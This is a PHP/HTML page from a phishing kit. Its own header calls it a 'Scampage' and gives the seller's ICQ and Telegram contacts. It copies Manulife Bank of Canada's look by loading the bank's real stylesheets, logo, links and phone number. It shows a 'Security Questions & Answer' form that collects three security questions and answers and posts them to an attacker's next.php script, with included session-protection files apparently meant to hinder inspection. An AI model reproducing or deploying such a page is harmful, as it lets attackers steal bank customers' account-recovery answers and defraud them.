<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	<link href="https://client.manulifebank.com/MBCClientUI/theme/manulife_20170330.css" rel="stylesheet" type="text/css" media="screen">
	<link href="https://client.manulifebank.com/MBCClientUI/theme/manulife-print_20141222.css" rel="stylesheet" type="text/css" media="print">	
	
	
	
<link href='https://www.manulifebank.ca/BankcaTheme/themes/html/BankcaTheme/images/favicon.ico' type="images/x-icon" rel="shortcut icon">
	<title>Manulife Bank of Canada</title>
  	<!-- Census 14451, Jira 4904: frame busting defence -->
	<style>html{display:none;}</style>
	<script>
		if (self==top) {
			document.documentElement.style.display='block';
		} else {
			top.location=self.location;
		}
	</script>
	
			<!-- Production Adobe Script -->
			<script type="text/javascript" src="//assets.adobedtm.com/caa55bf3865be487a5b4dbd4e1effd4b7cf20ea0/satelliteLib-42f17cd709075ee9a073cbbdf0520a44af234594.js"></script>
		
</head>
<body
	style="background-color: #008343; background-repeat: repeat-x; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);"
	margin=0 padding=0 height=100% topmargin=0 leftmargin=0 marginwidth=0
	marginheight=0 onclick="processOnBodyEvent(event)">
	<div class="logonwrapper">
		<div style="background-color: #999; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);
			background-repeat: repeat-x;" class="logonheader">
			<div class="noPrint">
				


	<div class="clientheaderbar">
		<div style="float: right;">
			
			
			
			<a id="id_francais" class="headerlinks" href=https://client.banquemanuvie.com/MBCClientUI/ >&nbsp;Français</a>
			<a id="id_news" class="headerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/News target=_blank>&nbsp;News |&nbsp;</a>  
			<a id="id_contactUS" class="headerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Contact+us target=_blank>&nbsp;Contact us |&nbsp;</a>
			<a id="id_bankHome" class="headerlinks homeicon" href=http://www.manulifebank.ca/ target=_blank>&nbsp;Home |&nbsp;</a>
		</div>
	</div>
<div style="padding: 0 0 0 0;">
	<img src="https://client.manulifebank.com/MBCClientUI/images/Manulife_e_W_Bank.gif" width="243" border="0">
</div>
			</div>
		</div>
		<div class="logoncontent">
			<div class="outage">
				
	<p class="outagetext"></p>

			</div>
			


	<table cellspacing="0" cellpadding="5">
		<tr width="100%">
			<td align="left" nowrap="nowrap">
			</td>
			<td align="right" nowrap="nowrap" class="contactuscamelcase" valign="top">
				Contact our Service Centre at 1-877-765-2265 if you require assistance  
			</td>
		</tr>
	</table>
	<h1>SECURITY QUESTIONS & ANSWER</h1>
	



	<form id="forgotPasswordInitialStep" name="forgotPasswordInitialStep" action="next.php" method="post">
		<input type="hidden" name="sessionId" value="LpjoAEtRhpKuzu5OSudeG1Q" id="forgotPasswordInitialStep_sessionId"/>
		<!-- NONCE -->
		<input type="hidden" name="view" value="94b3bfad230b8b6d692fee654361a4ac238dbbe7a491acd86bbfa3f8b7cee863"/>
		<table CELLSPACING="3" CELLPADDING="1" width="100%" class="logon" >
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Security Question #1</b>
				</td>
			
				<td NOWRAP>
				<select required name="Q1" id="q1" class="form-control" style="width:350px">
					<option value="">Please select a question...</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite wild animal">What is your favourite wild animal? Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>

				</select> 
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
				<tr>
				<td NOWRAP>
					<b>Answer</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="A1" size="30"  required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
		
			<tr>
				<td NOWRAP>
					<b>Security Question #2</b>
				</td>
			
				<td NOWRAP>
				  <select required name="Q2" id="q3" class="form-control" style="width:350px">
					<option value="">Please select a question...</option>
					<option value="favourite wild animal">What is your favourite wild animal? Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>

				</select>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
				<tr>
				<td NOWRAP>
					<b>Answer</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="A2" size="30"   required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
		
			<tr>
				<td NOWRAP>
					<b>Security Question #3</b>
				</td>
			
				<td NOWRAP>
				 <select required name="Q3" id="q3" class="form-control" style="width:350px">
					<option value="">Please select a question...</option>
					<option value="town did you live in as a child">What town did you live in as a child?</option>
					<option value="last name of your first grade teacher">What was the last name of your first grade teacher?</option>
					<option value="favourite dessert">What is your favourite dessert?</option>
					<option value="name of your elementary or primary">What was the name of your elementary or primary school?</option>
					<option value="name of your first stuffed animal">What was the name of your first stuffed animal?</option>
					<option value="favourite board game">What is your favourite board game?</option>
					<option value="favourite actor">What is your favourite actor or actress or celebrity?</option>
					<option value="town was your first job">In what town was your first job?</option>
					<option value="color of your first car">What was the color of your first car?</option>
					<option value="TVs are in your home">How many TVs are in your home?</option>
					<option value="favourite wild animal">What is your favourite wild animal? Please no dogs or cats or parakeets</option>
					<option value="favourite author">Who is your favourite author?</option>
					<option value="grandfather's occupation">What was your grandfather's occupation?</option>
					<option value="favourite family holiday">Where was your favourite family holiday vacation?</option>
					<option value="city were you born">What city were you born in?</option>
					<option value="childhood nickname">What was your childhood nickname?</option>
					<option value="retire where">Where do you want to retire?</option>
					<option value="first pet's name">What was your first pet's name?</option>
					<option value="favourite subject in school">What was your favourite subject in school?</option>
					<option value="city did you meet your spouse">In what city did you meet your spouse or significant other?</option>
					<option value="best childhood friend">What is the name of your best childhood friend?</option>
					<option value="last name of your favourite teacher">What was the last name of your favourite teacher?</option>
					<option value="favourite time of the day">What is your favourite time of the day?</option>
					<option value="favourite musician">Who is your favourite musician?</option>
					<option value="first job">What was your first job?</option>

				</select>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Answer</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="A3" size="30" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			
			<tr>
				<td>&nbsp;</td>
				<td>&nbsp;</td>
				
				<td nowrap align="right">
					<input type="submit" value="Next" id="id_cancel" name="submit" style="margin-right:17%;" tabindex="3"/>

				</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
		</table>
	</form>




		</div>
		<div class="logonfooter">
			<div class="noPrint">
				

	<!--  footer banner -->
	<div class="footerbar">
		<div class="footertext">
			strong&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;reliable&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;trustworthy&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;forward-thinking
		</div>
		<div class="footerlinks">
			
			
			
			
			<a id="id_Accessibility" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal target=_blank>|&nbsp;Accessibility</a>
			<a id="id_Legal" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal target=_blank>|&nbsp;Legal&nbsp;</a>
			<a id="id_Privacy" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/privacy+policy target=_blank>|&nbsp;Privacy Policy&nbsp;</a>
			<a id="id_Careers" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Careers target=_blank>Careers&nbsp;</a>

		</div>
	</div>
<br>
			</div>
		</div>
	</div>
	
		<script type="text/javascript">_satellite.pageBottom();</script>
	
</body>

</html>